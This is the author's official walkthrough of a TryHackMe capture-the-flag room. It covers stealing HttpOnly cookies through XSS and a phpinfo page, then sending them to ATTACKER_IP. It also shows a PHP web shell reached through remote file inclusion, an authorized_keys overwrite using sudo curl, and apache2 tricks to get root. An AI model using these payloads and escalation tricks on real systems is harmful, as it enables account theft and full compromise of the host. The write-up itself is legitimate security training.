---
title: Robots room official writeup
draft: false
tags:
  - http-only-cookies
  - xss
  - RFI
date: 2025-03-17
---
## Summary

This room wants to be a (very small) tribute to one of my favourite writers: I. Asimov.

The two key things I want to emphasize in this room are:

- a trick to steal HttpOnly cookies in presence of a page where cookies are reflected (phpinfo page in this case)
- a trick to achieve arbitrary file write with apache2 that I accidentaly found as an unintended while doing this room https://tryhackme.com/r/room/hijack

We have two web servers, one running on port 9000 and the other on port 80. The first one seems a default page from an ubuntu
server installation. The second one gives only a forbidden response. Inspecting `/robots.txt` we found the three laws of robotics, stolen directly from last.fm (if you are curious here is some background: `https://www.wired.com/2010/08/robot-laws/`).

If we go to `/harm/to/self` there is a web application which turns out to be vulnerable to XSS: we can simply register a username like

```html
<script src="http://ATTACKER_IP:8000/pwn.js"></script>
```

At first this does not seem very useful because cookies are HttpOnly, but combined with the `phpinfo()` page it allows us to steal cookies. For instance you can use this `pwn.js`:

```javascript
fetch('http://xyz.thm/harm/to/self/server_info.php', { method: 'GET', mode: 'no-cors'})
  .then(response => response.text())
  .then(text => {
    cookie = text.match(/_COOKIE.{1,2000}/)[0];
    fetch('http://ATTACKER_IP:8000/?cookie=' + encodeURIComponent(cookie), { method: 'GET', mode: 'no-cors'} );
  });
```

From here you go to `admin.php` and obtaining RCE is as simple as pointing the `url` to a self hosted php payload containing for instance

```php
<?php

system($_REQUEST['cmd']);
```

Please note that if you are good with javascript, you can probably let the admin bot do the job for you.

## rgiskard credentials

Now that we have code execution we can access the database (for instance forwarding port 3306 of the db container using chisel), and we get the hash for user `rgiskard`. Remembering that initial passwords are the MD5 hash of username concatenated with date of birth, we can simply generate all possible `md5("rgiskard" . DDMM)` in order to find a valid password. Note that these are candidate **cleartext** passwords: we can use them as a wordlist to crack the md5 hash found in the database.

## Pivoting to user dolivaw using `curl`

Now that we are user `rgiskard` we see that we can execute curl as user `dolivaw` with `sudo`. A fun fact I never noticed: curl accepts multiple URLs, and multiple output options. We can abuse this to our advantage by doing something like this:

```bash
ssh-keygen
cp /home/rgiskard/.ssh/id_rsa.pub /tmp/id_rsa.pub
sudo -u dolivaw curl 127.0.0.1/ -o /tmp/b file:///tmp/id_rsa.pub -o /home/dolivaw/.ssh/authorized_keys
ssh dolivaw@localhost
```

## The original idea for privesc: arbitrary file write using apache

As user `dolivaw` we can run apache as root using sudo. To escalate to root we can achieve arbitrary file write configuring a `CustomLog` format:

```bash
cat << EOF > /tmp/apache2.conf
ServerRoot "/tmp"
LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so
Listen *:8080
ErrorLog /tmp/error.log
LogFormat "whatever you want" exploit
CustomLog /tmp/pwned exploit
EOF

sudo apache2 -f /tmp/apache2.conf -k start
curl localhost:8080
cat /tmp/pnwed; ls -al /tmp/pnwed
```

Adjust configuration above to write public key to `/root/.ssh/authorized_keys` and access machine as root.

## Command execution as root via CustomLog pipe (by Djalil)

I think this one is the most elegant way to achieve RCE as root. When the CustomLog pipe is executed apache hasn't yet dropped privileges so you get direct command execution as root. 

```
CustomLog "|/bin/sh -c 'YOUR_COMAND_HERE'" combined
```

## Command execution by running CGIs (by Aquinas and Jaxafed)

An alternative way, pointed out by Aquinas during the testing phase, would be leveraging the ubuntu user (who can sudo to root without password), and CGI scripts. That's why there is no ubuntu user in this ubuntu machine. I thought this was sufficient, but unfortunately I  left there (at least):
- the vagrant user which has the same trivial way to become root
- another possibility would be using `User dolivaw` and `Group docker` as pointed out by Jaxafed (then mount the host filesystem inside a container).
In hindsight I should have removed the `mod_cgi.so` from the VM.

In general to use CGIs you can start with a configuration like the following

```
LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so
LoadModule cgid_module /usr/lib/apache2/modules/mod_cgid.so
LoadModule mime_module /usr/lib/apache2/modules/mod_mime.so
LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so

Listen 8080
ServerRoot /etc
DocumentRoot /tmp
ErrorLog /tmp/error.log
CustomLog /tmp/access.log combined
ServerName localhost

<VirtualHost *:8080>
<Directory "/tmp">
    AllowOverride None
    Options +Indexes +ExecCGI
    AddHandler cgi-script .cgi .pl
    Require all granted
</Directory>
</VirtualHost>

User ubuntu
Group ubuntu
```

Then put a `test.cgi` under `/tmp` (and remember to make it executable)

```perl
#!/usr/bin/perl
print "Content-type: text/html\n\n";
system("sudo -l");
system("sudo ls -la /root");
```

Finally `curl localhost:8080/test.cgi`:

## A totally unintended root

A totally unintended root (again pointed out by Jaxafed) that will give flag read but no shell is simply using this in apache configuration:

```
Include /root/root.txt
```

You will get the flag as an error message upon starting apache. This one was totally my fault :)
